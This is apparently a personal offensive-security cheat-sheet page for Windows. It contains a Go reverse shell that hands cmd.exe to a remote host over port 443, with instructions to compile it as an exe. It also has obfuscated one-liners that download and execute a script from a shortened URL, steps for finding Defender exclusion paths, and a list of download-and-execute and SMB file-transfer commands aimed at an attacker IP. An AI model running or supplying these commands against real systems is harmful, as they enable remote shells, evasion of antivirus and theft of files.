---
# the default layout is 'page'
icon: fas fa-subway
order: 6
---
#  🖥️ Windows 10 Bypass With GO 
Video Explaination [here](https://youtu.be/zM8EVJdErsc?si=uGHzpHG8HMlHIfjZ)
### nano pleasesubscribe.go
```elixir
package main
import ("os/exec"; "net"; "time")

func main() { 
        time.Sleep(2 * time.Second)
        c,_:= net.Dial("tcp", "192.168.x.x:443")
        cmd:= exec.Command("cmd")
        cmd.Stdin = c
        cmd.Stdout = c
        cmd.Stderr = c
        cmd.Run() 
}
```
### Compile it !
```elixir
GOOS=windows GOARCH=amd64 go build -o pleasesubscribe.exe pleasesubscribe.go
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# 🔥 Fire Your Notepad.exe
```bash
# Daily Stuff
irm is.gd/Q2Katq | iex

# Open Stuff
Invoke-RestMethod is.gd/Q2Katq | Invoke-Expression

# Hide Stuff
& (gal ir?) is.gd/Q2Katq |& (gal i?x)
```

# 💭  Defender Exclusion Path Detection
[John Hammand Video ](https://youtu.be/fxO1V0mzePQ?si=DkA5820pjg2F47pV)
### Add Exclusion Path
```elixir
# Need Admin Priv
Search virus  ---> open it ---> click on Virus & Threat Protection ( Manage setting ) ----> Go at the End of the page ---> See the Exclusion ====> Now you can add or remove Paths.
```
## For ADMIN User
```elixir
(Get-MpPreference).ExclusionPath
```
## For Low Power User
```elixir
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -FilterXPath "*[System[(EventID=5007)]]" | Where-Object { $_.Message -like "*exclusion*" } | Select-Object Message | FL
```
# 🐼 Get your Box IpAddress
## IPv4 Address
```elixir
Get-NetIPAddress -AddressFamily IPv4 |findstr /i ipaddress
```
## IPv6 Address
```elixir
Get-NetIPAddress -AddressFamily IPv6 |findstr /i ipaddress
```
### Get Internet Facing IPAddress
```elixir
$pubIPv4 = Invoke-RestMethod -Uri "https://api.ipify.org"
$pubIPv6 = Invoke-RestMethod -Uri "https://api64.ipify.org"

Write-Output "Your Public IPv4 Address : $pubIPv4"
Write-Output "Your Public IPv6 Address : $pubIPv6"
```
### One linear
```elixir
"Your IPv4 is: $(irm api.ipify.org)"; "Your IPv6 is: $(irm api64.ipify.org)"    # irm= invoke Rest Method 
```

#  🗃️ File Transfer
```elixir
# 1. IEX DownloadString (Execute in memory)
IEX(New-Object Net.WebClient).DownloadString("http://$ip:$port/file")

# 2. curl (Windows 10+)
curl http://$ip:$port/file -o file

# 3. Invoke-WebRequest
powershell "iwr -Uri http://$ip:$port/file -OutFile C:\Windows\Temp\file"

# 4. NetExec (needs valid credentials)
nxc smb $ip -u '' -p '' --put-file file C:\Windows\Temp\file

# 5. PowerShell DownloadFile
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://$ip:$port/file','C:\Temp\file')"

# 6. Short version (iwr + IEX)
IEX(iwr 'http://$ip:$port/file' -UseBasicParsing)

# 7. Certutil
certutil -urlcache -split -f http://$ip:$port/file file
certutil -urlcache * delete

# 8. wget (PowerShell alias)
wget "http://$ip:$port/file" -OutFile "C:\Windows\Temp\file"

# 9. smbserver
impacket-smbserver share ./ -smb2support -user 0xmr -pass ''
or 
smbserver.py share ./ -smb2support -user 0xmr -pass ''

##  Copy to windows
net use \\$Attacker_IP\share /user:0xmr
copy \\$Attacker_IP\share\file C:\Temp\file

##  copy from windows
net use \\$Attacker_IP\share /user:0xmr
copy file_name \\$Attacker_IP\share

# 10. Download and Execution Both
powershell "iwr -Uri http://${YOUR_KALI_IP_ADDRESS}:$port/file -OutFile C:/Windows/Tasks/file; C:/Windows/Tasks/file"

powershell -NoProfile -Command "$ip='$Attacker_IP'; iwr http://$ip:$port/file -OutFile $env:TEMP\file; Get-Content $env:TEMP\file"
```

# Some Python Automation...
```bash
# Used to Stable shell's
python3 -c "import pty; pty.spawn('/bin/bash')"

# Create Windows NTLM Password 
python3 -c "import hashlib; print(hashlib.new('md4', 'SuperSecureP@ssword'.encode('utf-16le')).digest().hex())"

# Common UTF-8 Formate
python3 -c "import hashlib; print(hashlib.new('md4', 'SuperSecureP@ssword'.encode('utf-8')).digest().hex())"   

# URL Encoding Think's
python3 -c "import urllib.parse; print(urllib.parse.quote('../'))"

# Encode Character's
python3 -c "from urllib.parse import quote; encode_username = quote('username_here'); print(encode_username)"   
```
